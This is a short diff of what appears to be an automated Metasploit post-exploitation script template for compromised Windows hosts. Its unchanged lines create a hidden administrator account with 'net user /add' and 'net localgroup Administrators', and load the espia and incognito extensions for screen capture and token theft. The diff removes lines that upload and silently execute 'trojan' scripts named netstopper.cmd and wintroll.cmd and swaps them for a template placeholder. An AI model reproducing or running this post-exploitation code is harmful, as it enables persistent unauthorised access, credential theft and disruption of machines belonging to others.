@@ -4,11 +4,7 @@
 				session.sys.process.execute("net user /add #!TS_ADMIN_USER!# #!TS_ADMIN_PASSWORD!#")
 				session.sys.process.execute("net localgroup Administrators #!TS_ADMIN_USER!# /add")
 				#!TS_AUTOPOST_PERSISTENCE!#
-				session.run_cmd('upload ./.trojans/netstopper.cmd .')
-				session.run_cmd('execute -H -f netstopper.cmd')
-				session.run_cmd('upload ./.trojans/wintroll.cmd .')
-				session.run_cmd('upload ./.trojans/wallpaper.bmp .')
-				session.run_cmd('execute -H -f wintroll.cmd')
+				#!TS_AUTOPOST_TROJANS!#
                                 session.run_cmd('use espia')
                                 session.run_cmd('use incognito')
                                 session.run_cmd('add_user #!TS_ADMIN_USER!# #!TS_ADMIN_PASS!# -h')
